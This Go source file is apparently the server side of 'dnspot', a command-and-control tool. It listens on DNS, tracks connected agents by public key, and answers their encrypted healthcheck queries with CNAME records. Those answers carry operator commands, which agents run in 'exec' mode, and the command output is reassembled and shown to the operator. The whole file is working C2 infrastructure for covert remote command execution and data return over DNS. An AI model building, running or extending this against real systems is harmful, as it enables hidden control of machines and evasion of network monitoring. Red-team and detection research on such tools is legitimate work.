package server

import (
	"bytes"
	"compress/gzip"
	"encoding/binary"
	"fmt"
	"io"
	"math"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/cryptography"
)

type Server struct {
	PrivateKeyBase36         string
	privateKey               *cryptography.PrivateKey
	ListenAddress            string
	EnforceClientKeys        bool
	AcceptedClientKeysBase36 []string
	acceptedClientKeys       *[]cryptography.PublicKey
	DNSSuffix                string
	Mode                     string
	io                       IO
}

// log levels
const (
	DEBUG = uint8(iota)
	INFO
	WARN
	ERR
	FATAL
)

// IO provides a common interface to work with dnspot
type IO interface {
	Logger(level uint8, format string, args ...interface{})
	GetInputFeed() chan string
	GetOutputFeed() chan string
}

var serverPacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)

// 3d buffer for public key and parentpartID. first string is the public key
var outgoingBuffer = make(map[string]map[uint16][]string)

// dedupPrevMsgHash is only for consecutive message duplicates
var dedupPrevMsgHash uint64

type agentStatusForServer struct {
	LastAckFromAgentServerTime      uint32
	LastAckFromAgentPacketTime      uint32
	NextMessageType                 c2.MsgType
	NextParentPartID                uint16
	HealthCheckIntervalMilliSeconds uint32
}

// first string is the public key
var connectedAgents = make(map[string]agentStatusForServer)

// log received healthcheck. if the agent is due to run a task, the server's response
// to the healthcheck will become different.
func (s Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	s.io.Logger(INFO, "Healthcheck, coming from %s", Packet.Signature)
	//register new agent in agent list
	agent, ok := connectedAgents[Packet.Signature.String()]
	if !ok {
		s.io.Logger(INFO, "Registering new agent in our Connected Agent List, %d agent(s) are connected", len(connectedAgents)+1)

		// UiAgentList.AddItem(Packet.Signature.String(), "", rune(len(ConnectedAgents)+65), nil)
		connectedAgents[Packet.Signature.String()] = agentStatusForServer{
			NextMessageType:                 c2.MessageHealthcheck,
			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
		}
	}
	// agent already exists, only update the timestamps and prepare the next packet based on message type
	agent.LastAckFromAgentPacketTime = Packet.Msg.TimeStamp
	agent.LastAckFromAgentServerTime = uint32(time.Now().Unix())
	connectedAgents[Packet.Signature.String()] = agent
	switch agent.NextMessageType {
	case c2.MessageHealthcheck: // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
		payload := []byte("Pong!")
		if math.Abs(float64(Packet.Msg.TimeStamp-uint32(time.Now().Unix()))) > 10 {
			s.io.Logger(WARN, "Time difference between server and agent is more than 10 seconds. This is not acceptable. Agent: %s, Server: %s", time.Unix(int64(Packet.Msg.TimeStamp), 0).Format("2006-01-02T15:04:05-0700"), time.Now().Format("2006-01-02T15:04:05-0700"))
		}
		//todo: should we pass it on to MessageSyncTimeHandler function here?

		// todo: check the actual next message time here and send a message appropriately
		s.io.Logger(INFO, "preparing a response for a healthcheck message")
		msg := c2.MessagePacket{
			TimeStamp:   uint32(time.Now().Unix()),
			MessageType: agent.NextMessageType,
		}
		Answers, _, err := c2.PreparePartitionedPayload(msg, payload, s.DNSSuffix, s.privateKey, Packet.Signature)
		if err != nil {
			s.io.Logger(ERR, "Error preparing a response for a healthcheck message: %s", err.Error())
			return err
		}

		for _, A := range Answers {
			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
			if err != nil {
				s.io.Logger(WARN, "%s", err)
			}
			q.Answer = append(q.Answer, cname)
		}
		// this only happens when we're switching mode. after this one, the rest of the requests
		// won't be coming in as healthcheck originally, so won't be hitting this function altogether
	case c2.MessageExecuteCommand:
		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
		// first check to see if this is a residual packet from a previous multi-part convo
		if len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartID]) == 0 {
			return nil

		}
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartID][0])) //todo:fix the 0 index
		if err != nil {
			s.io.Logger(WARN, "%s", err)

		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

// shows the output of any command run by agent and sent back to us.
func (s Server) displayCommandResult(fullPayload []byte, signature *cryptography.PublicKey) {
	out := bytes.Trim(fullPayload, "\x00")
	if c2.FNV1A(out) == uint64(dedupPrevMsgHash) {
		return
	}
	dedupPrevMsgHash = c2.FNV1A(out)
	rdata := bytes.NewReader(out)
	r, err := gzip.NewReader(rdata)
	if err == nil {
		out, _ = io.ReadAll(r)
	}
	s.io.GetOutputFeed() <- fmt.Sprintf("[%s]: %s", signature.String(), out)
}

func (s Server) HandleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	_, ok := connectedAgents[Packet.Signature.String()]
	if !ok {
		s.io.Logger(ERR, "agent not recognized")
	}
	// handle multipart incoming
	serverPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)] = append(serverPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)], Packet)
	// if Packet.Msg.ParentPartID != 0 { // multi part
	//fist and middle packets
	msg := c2.MessagePacket{
		TimeStamp:    uint32(time.Now().Unix()),
		MessageType:  c2.MessageExecuteCommandResponse,
		ParentPartID: Packet.Msg.ParentPartID,
		PartID:       Packet.Msg.PartID,
	}
	payload := []byte("Ack!")
	if Packet.Msg.IsLastPart || (Packet.Msg.ParentPartID == 0) {
		msg.IsLastPart = true
		agent := connectedAgents[Packet.Signature.String()]
		agent.NextMessageType = c2.MessageHealthcheck
		connectedAgents[Packet.Signature.String()] = agent
		payload = []byte("Ack! Last Part")
	}
	// Config.io.Logger(INFO,"sending plyload %#v\n", msg)
	// time.Sleep(2 * time.Second)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, s.DNSSuffix, s.privateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			s.io.Logger(WARN, "%s", err)
		}
		q.Answer = append(q.Answer, cname)
	}
	if !Packet.Msg.IsLastPart && !(Packet.Msg.ParentPartID == 0) {
		return nil
	}
	// }

	fullPayload := make([]byte, 0)
	packets := c2.CheckMessageIntegrity(serverPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)])
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	// todo: clean the memory for this parentpartID
	// delete(ServerPacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
	s.displayCommandResult(fullPayload, Packet.Signature)
	// remove the buffer from memory
	delete(serverPacketBuffersWithSignature, int(Packet.Msg.ParentPartID))
	return nil
}

func (s Server) mustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptography.PublicKey, msg string) error {
	// As part of the incoming packet, we'll get the partid as well as parentPartID so we know which part to send next. we just need to cache the whole partition up
	Answers, parentPartID, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), s.DNSSuffix, s.privateKey, agentPublicKey)
	//todo: single part messages always have parentPartId = 0, so we need to check if it's single part or multi part and probably don't cache
	//todo: what are we getting from the client? let's decrypt and log those

	if targetBuffer, ok := outgoingBuffer[agentPublicKey.String()][parentPartID]; ok {
		if parentPartID == 0 {
			// if there was a single packet living in the cache before, delete it before proceed
			// todo: maybe this is the place for this but I think it's better to be cleaned up elsewhere
			// delete(outgoingBuffer[agentPublicKey.String()], parentPartId)
			outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
			outgoingBuffer[agentPublicKey.String()][parentPartID] = append(outgoingBuffer[agentPublicKey.String()][parentPartID], Answers[0])
		}
		s.io.Logger(INFO, "key and ParentPartId already exist in the buffer, overwriting...")

	} else {
		//initialize the map
		outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
		targetBuffer = append(targetBuffer, Answers...)
		outgoingBuffer[agentPublicKey.String()][parentPartID] = targetBuffer
	}
	s.io.Logger(INFO, "command was successfully added to outgoing buffer to be sent")

	// set NextMessageType to let the healthcheck responder know
	agent := connectedAgents[agentPublicKey.String()]
	agent.NextMessageType = msgPacket.MessageType
	agent.NextParentPartID = parentPartID
	connectedAgents[agentPublicKey.String()] = agent
	// todo: potentially a channel to notify the changes to agent's status and flick it to true when this happens?
	// todo: set interval before returning the packet
	return nil
}

// handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
// the input of this function comes directly from TUI input field. it was renamed
// because it'll now consider they message type as a configuration item and
// can provide command execution as well as chat.
func (s Server) sendMessageToAgent(agentPublicKey *cryptography.PublicKey, command string) error {

	var cmdType c2.CmdType
	if s.Mode == "chat" {
		cmdType = c2.CommandEcho
	}
	if s.Mode == "exec" {
		cmdType = c2.CommandExec
	}
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageExecuteCommand,
		Command:     cmdType,
	}
	return s.mustSendMsg(msg, agentPublicKey, command)
}

func (s Server) messageChatHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := connectedAgents[Packet.Signature.String()]
	acknowledgedID := Packet.Msg.PartID
	// handle last packet ID
	if uint16(len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartID])) == acknowledgedID {
		return nil
	}
	if Packet.Msg.IsLastPart || Packet.Msg.ParentPartID == 0 {
		// reset the agent status to healthcheck and clean the buffer
		agent.NextMessageType = c2.MessageHealthcheck
		delete(outgoingBuffer[Packet.Signature.String()], agent.NextParentPartID)
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartID][acknowledgedID+1]))
	if err != nil {
		s.io.Logger(WARN, "%s", err)
	}
	// todo: go back to the healthcheck handler and send the next packet
	// todo: print output
	q.Answer = append(q.Answer, cname)
	// Config.io.Logger(INFO,"sending chat message '%s' to the client", command)
	//msg := c2.MessagePacket{
	//	TimeStamp:   uint32(time.Now().Unix()),
	//	MessageType: c2.MessageChat,
	//}
	//return MustSendMsg(msg, agentPublicKey, c2.MessageChat, command)
	return nil
}

func messageChatResResHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	// we only get this when the message's last part have been received and parsed.
	// just need to switch back the agent to healthcheck mode
	agent := connectedAgents[Packet.Signature.String()]
	agent.NextMessageType = c2.MessageHealthcheck
	connectedAgents[Packet.Signature.String()] = agent

	return nil

}

// remove idle agents after 60 seconds
func (s Server) removeIdleAgents() {
	s.io.Logger(INFO, "Removing idle agents")
	for k, v := range connectedAgents {
		idleTime := time.Now().Unix() - int64(v.LastAckFromAgentServerTime)
		if idleTime > 60 {
			s.io.Logger(INFO, "removing agent %s since it has been idle for %d seconds", k, idleTime)
			delete(connectedAgents, k)
			// for i := range UiAgentList.FindItems(k, "", false, true) {
			// 	UiAgentList.RemoveItem(i)
			// }
		}
	}
}

// handle incoming "ack" packets of multipart RunCommand packets from agents
func (s Server) handleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := connectedAgents[Packet.Signature.String()]
	acknowledgedID := Packet.Msg.PartID
	// handle last packet ID
	if uint16(len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartID])) == acknowledgedID {
		return nil
	}
	if Packet.Msg.IsLastPart {
		// reset the agent status to healthcheck and clean the buffer
		agent.NextMessageType = c2.MessageHealthcheck
		delete(outgoingBuffer[Packet.Signature.String()], agent.NextParentPartID)
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartID][acknowledgedID+1]))
	if err != nil {
		s.io.Logger(WARN, "%s", err)
	}
	// todo: go back to the healthcheck handler and send the next packet
	// todo: print output
	q.Answer = append(q.Answer, cname)
	return nil
}

func (s Server) messageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg, durationMilliseconds uint32) error {
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageSetHealthInterval,
	}
	payload := []byte{}
	binary.BigEndian.PutUint32(payload, durationMilliseconds)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, s.DNSSuffix, s.privateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			s.io.Logger(WARN, "%s", err)
		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

func (s Server) parseQuery(m *dns.Msg) error {
	// since the C2 works by A questions at the moment, we cna check dedup by looking at the first question
	// moved this to decrypt incoming packet
	// if !c2.DedupHashTable.Add([]byte(m.Question[0].Name)) {
	// 	Config.io.Logger(INFO, "Duplicate message received, discarding")
	// 	return nil
	// }
	outs, skip, err := c2.DecryptIncomingPacket(m, s.DNSSuffix, s.privateKey, nil)
	if err != nil {
		s.io.Logger(INFO, "Error in Decrypting incoming packet: %v", err)
	}
	if !skip {
		for _, o := range outs {
			switch msgType := o.Msg.MessageType; msgType {
			case c2.MessageHealthcheck:
				return s.messageHealthcheckHandler(o, m)
			case c2.MessageExecuteCommand:
				return s.handleRunCommandAckFromAgent(o, m)
			case c2.MessageExecuteCommandResponse:
				return s.HandleExecuteCommandResponse(o, m)
			case c2.MessageSetHealthInterval:
				return nil //
			case c2.MessageSyncTime:
				return nil // automatically done as part of routine healthcheck
			}
		}
	}

	// }
	//todo: prepare response
	return nil
}

func (s Server) handle53(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = true

	switch r.Opcode {
	case dns.OpcodeQuery:
		err := s.parseQuery(m)
		if err != nil {
			s.io.Logger(WARN, "%s", err)
		}
	}
	if err := w.WriteMsg(m); err != nil {
		s.io.Logger(WARN, "%s", err)
	}
}

func (s Server) runDNS() {

	dns.HandleFunc(".", s.handle53)

	// start server
	server := &dns.Server{Addr: s.ListenAddress, Net: "udp"}
	s.io.Logger(INFO, "Started DNS on %s -- listening", server.Addr)
	err := server.ListenAndServe()
	if err != nil {
		s.io.Logger(FATAL, "%s", err)
	}
	if err := server.Shutdown(); err != nil {
		s.io.Logger(WARN, "%s", err)
	}

}

// returns the first item of an arbitrary map
func first(m map[string]agentStatusForServer) (out string) {
	for k := range m {
		out = k
		break
	}
	// this should be unreachable
	return
}

// RunServer creates a new Server instance
func (s Server) RunServer(serverIo IO) {
	s.io = serverIo

	// set global flag that we're running as server
	var err error
	s.privateKey, err = cryptography.PrivateKeyFromString(s.PrivateKeyBase36)
	if err != nil {
		s.io.Logger(FATAL, "%s", err)
	}

	s.io.Logger(INFO, "Use the following public key to connect clients: %s", s.privateKey.GetPublicKey().String())

	// todo: public keys

	if !strings.HasSuffix(s.DNSSuffix, ".") {
		s.DNSSuffix = s.DNSSuffix + "."
	}
	if !strings.HasPrefix(s.DNSSuffix, ".") {
		s.DNSSuffix = "." + s.DNSSuffix
	}

	go s.runDNS()

	go func() {
		for text := range s.io.GetInputFeed() {
			agent := first(connectedAgents) //todo: this will always send it to the first agent, needs to be configurable
			// agent, _ := UiAgentList.GetItemText(UiAgentList.GetCurrentItem())
			pubkey, err := cryptography.PublicKeyFromString(agent)
			if err != nil {
				s.io.Logger(ERR, "can't find a key to send a message to: %s", err)
			} else if len(text) > 0 {
				_ = s.sendMessageToAgent(pubkey, text)
			}
		}
	}()

	// fmt.Println("here") //todo:remove
	// select {}

}
